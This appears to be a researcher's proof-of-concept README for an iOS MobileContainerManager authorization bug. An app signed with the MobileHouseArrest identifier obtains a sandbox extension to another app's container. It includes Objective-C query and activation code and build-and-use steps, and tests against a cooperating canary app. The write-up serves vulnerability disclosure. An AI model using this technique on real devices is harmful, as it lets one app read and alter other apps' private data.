# MobileHouseArrest container access PoC

This PoC demonstrates a MobileContainerManager authorization bug. A
development-signed app can use the CodeDirectory identifier
`com.apple.mobile.MobileHouseArrest` and request another app's container.

## Root cause

MobileContainerManager used the caller's CodeDirectory identifier as an
allow-list key. The MobileHouseArrest entry allowed wildcard container lookup.
The affected check did not also require an Apple signing anchor, Apple team,
platform-binary flag, or known CDHash.

Notes, Safari, app-group, and WebKit container access are effects of this one
authorization bug. They are not separate bugs.

## Core request

The application must have this exact CodeDirectory identifier:

```text
com.apple.mobile.MobileHouseArrest
```

The request uses a class-2 app-data query for a cooperating test application:

```objc
container_query_t query = query_create();
query_set_class(query, 2);
query_set_flags(query, UINT64_C(0x900000000));
query_set_part(query, 0);

xpc_object_t ids = xpc_array_create(NULL, 0);
xpc_array_set_string(ids, XPC_ARRAY_APPEND,
                     "local.research.SandboxCanaryVictim");
query_set_ids(query, ids);

container_object_t borrowed = query_result(query);
container_object_t object = borrowed != NULL ? object_copy(borrowed) : NULL;
```

The returned object supplies a sandbox extension:

```objc
char *token = copy_token(object);
BOOL tokenPresent = token != NULL && token[0] != '\0';
free(token);

BOOL activated = tokenPresent && activate(object, false);
```

After activation, normal file APIs can access the selected container:

```objc
NSString *root = [NSString stringWithUTF8String:object_path(object)];
NSString *canary = [root stringByAppendingPathComponent:
    @"Documents/sbescape-canary.txt"];

NSData *original = [NSData dataWithContentsOfFile:canary];
[changed writeToFile:canary atomically:NO];
[original writeToFile:canary atomically:NO];
```

[`poc.m`](poc.m) checks denial before activation, changes a cooperating canary,
verifies the new bytes, restores the original bytes, and checks denial again.

## Use

1. Add `poc.m` to an Objective-C iOS application target.
2. Set `PRODUCT_BUNDLE_IDENTIFIER` to
   `com.apple.mobile.MobileHouseArrest`.
3. Install a cooperating app with identifier
   `local.research.SandboxCanaryVictim`.
4. Call `run_mobilehousearrest_poc()` from an explicit test action.

Build with the `iphoneos` SDK for `arm64e`. No private entitlement is required.

## Result and limits

Runtime proof exists on `iPhone18,2`, build `24A5390f`. The test received a
usable extension and changed and restored the cooperating app's canary.

The primitive is scoped container read/write. It does not bypass POSIX
ownership, Data Protection, Keychain policy, TCC, AMFI, or unrelated
MobileContainerManager mutation commands.

Static analysis of `iPhone18,2` build `24A5408d` shows that nonzero-access
extension issuance through this allow-list result is blocked. A runtime denial
test on that exact build remains useful confirmation.
